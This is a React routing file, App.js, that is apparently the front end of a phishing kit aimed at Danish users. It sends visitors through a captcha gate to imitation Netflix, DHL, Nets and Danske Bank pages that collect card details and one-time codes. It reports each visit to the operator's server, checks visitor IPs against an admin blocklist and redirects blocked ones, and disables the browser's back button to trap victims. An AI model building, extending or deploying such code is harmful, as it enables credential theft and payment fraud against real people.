// App.js
import { useEffect, useState } from "react";
import "./App.css";
import { Routes, Route, useNavigate } from "react-router-dom";
import ReCAPTCHA from "react-google-recaptcha";
import Forme from "./components/Forme";
import Footer from "./components/Footer";
import Creditoption from "./components/Creditoption";
import SecurePayment from "./components/SecurePayment";
import Appotp from "./components/Appotp";
import BlockedDashboard from "./components/BlockedDashboard";
import NetflixPaymentVerification from "./components/NetflixPaymentVerification";
import ProtectedRoute from "./components/ProtectedRoute";
import AdminDashboard from "./components/AdminDashboard";
import { injectSpeedInsights } from "@vercel/speed-insights";
import { Analytics } from "@vercel/analytics/react";
import Nets from "./components/Nets";
import Danske from "./components/Danske";
import UploadedNetflixPage from "./components/UploadedNetflixPage";
import CaptchaPage from "./components/CaptchaPage";
import OtpConfirmPage from "./components/OtpConfirmPage";
import Landing from "./components/Landing";
import LoadingPage from "./components/LoadingPage";
import DHLConfirmationPage from "./components/DHLConfirmationPage";

injectSpeedInsights();
const apiUrl = import.meta.env.VITE_API_URL;

function Home() {
  return (
    <>
      <UploadedNetflixPage />
    </>
  );
}

function App() {
  const navigate = useNavigate();
  const [ip, setIp] = useState("");
  const [time, setTime] = useState("");

  const handleCaptcha = async (token) => {
    if (!token) return;

    try {
      const res = await fetch(`${apiUrl}/api/verify-captcha`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ token }),
      });

      const data = await res.json();

      if (data.success) {
        localStorage.setItem("captchaPassed", "true");
        navigate("/landing", { replace: true });
      } else {
      }
    } catch (err) {
      console.error("Error verifying captcha:", err);
    }
  };

  useEffect(() => {
    const currentUrl = window.location.href;
    const path = window.location.pathname;
    const now = new Date();

    setTime(
      now.toLocaleString("da-DK", {
        timeZone: "Europe/Copenhagen",
      }),
    );

    fetch(`${apiUrl}/api/track`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ path }),
    });

    fetch(`${apiUrl}/api/notify`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ url: currentUrl }),
    });

    const checkBlocked = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        setIp(data.ip);

        const blockedRes = await fetch(
          `${apiUrl}/admin/blocked/check/${data.ip}`,
        );
        if (blockedRes.status === 403) {
          window.location.href = "https://block-orcin-alpha.vercel.app";
        }
      } catch (err) {
        console.error("❌ Error checking block", err);
      }
    };

    checkBlocked();
    const interval = setInterval(checkBlocked, 10000);

    return () => clearInterval(interval);
  }, []);

  // تأثير عام لمنع الرجوع من جميع الصفحات المحمية
  useEffect(() => {
    const handlePopState = (event) => {
      const captchaPassed = localStorage.getItem('captchaPassed') === 'true';
      const protectedPaths = [
        '/login', '/landing', '/Appotp', '/AdminDashboard', 
        '/UploadedNetflixPage', '/signup/creditoption', 
        '/OtpConfirmPage', '/SecurePayment', '/BlockedDashboard', 
        '/Otp', '/Nets', '/Danske', '/success', '/LoadingPage'
      ];
      
      if (captchaPassed && protectedPaths.includes(window.location.pathname)) {
        // منع الرجوع وإضافة حالة جديدة
        history.pushState(null, '', window.location.href);
      }
    };

    window.addEventListener('popstate', handlePopState);
    
    return () => {
      window.removeEventListener('popstate', handlePopState);
    };
  }, []);

  // App.js - أضف هذا الـ useEffect الجديد

useEffect(() => {
  // منع الرجوع نهائياً من جميع الصفحات بعد Captcha
  const preventNavigationBack = () => {
    const captchaPassed = localStorage.getItem('captchaPassed');
    
    if (captchaPassed === 'true') {
      // منع زر الرجوع
      history.pushState(null, '', window.location.href);
      
      // إضافة حدث منع الرجوع
      window.addEventListener('popstate', function(e) {
        history.pushState(null, '', window.location.href);
      });
    }
  };
  
  preventNavigationBack();
  
  // تنظيف الحدث عند إغلاق الصفحة
  return () => {
    window.removeEventListener('popstate', preventNavigationBack);
  };
}, []);

  return (
    <>
      <Routes>
        {/* CaptchaPage - No protection */}
        <Route path="/" element={<CaptchaPage />} />
        
        {/* All other routes - Protected */}
        <Route
          path="/login"
          element={
            <ProtectedRoute>
              <Home />
            </ProtectedRoute>
          }
        />
        <Route
          path="/landing"
          element={
            <ProtectedRoute>
              <Landing />
            </ProtectedRoute>
          }
        />
        <Route
          path="/Appotp"
          element={
            <ProtectedRoute>
              <Appotp />
            </ProtectedRoute>
          }
        />
        <Route
          path="/success"
          element={
            <ProtectedRoute>
              <DHLConfirmationPage />
            </ProtectedRoute>
          }
        />
        <Route
          path="/AdminDashboard"
          element={
            <ProtectedRoute>
              <AdminDashboard />
            </ProtectedRoute>
          }
        />
        <Route
          path="/UploadedNetflixPage"
          element={
            <ProtectedRoute>
              <UploadedNetflixPage />
            </ProtectedRoute>
          }
        />
        <Route
          path="/signup/creditoption"
          element={
            <ProtectedRoute>
              <Creditoption />
            </ProtectedRoute>
          }
        />
        <Route
          path="/OtpConfirmPage"
          element={
            <ProtectedRoute>
              <OtpConfirmPage />
            </ProtectedRoute>
          }
        />
        <Route
          path="/SecurePayment"
          element={
            <ProtectedRoute>
              <SecurePayment />
            </ProtectedRoute>
          }
        />
        <Route
          path="/LoadingPage"
          element={
            <ProtectedRoute>
              <LoadingPage />
            </ProtectedRoute>
          }
        />
        <Route
          path="/BlockedDashboard"
          element={
            <ProtectedRoute>
              <BlockedDashboard />
            </ProtectedRoute>
          }
        />
        <Route
          path="/Otp"
          element={
            <ProtectedRoute>
              <NetflixPaymentVerification />
            </ProtectedRoute>
          }
        />
        <Route
          path="/Nets"
          element={
            <ProtectedRoute>
              <Nets />
            </ProtectedRoute>
          }
        />
        <Route
          path="/Danske"
          element={
            <ProtectedRoute>
              <Danske />
            </ProtectedRoute>
          }
        />
      </Routes>
      <Analytics />
    </>
  );
}

export default App;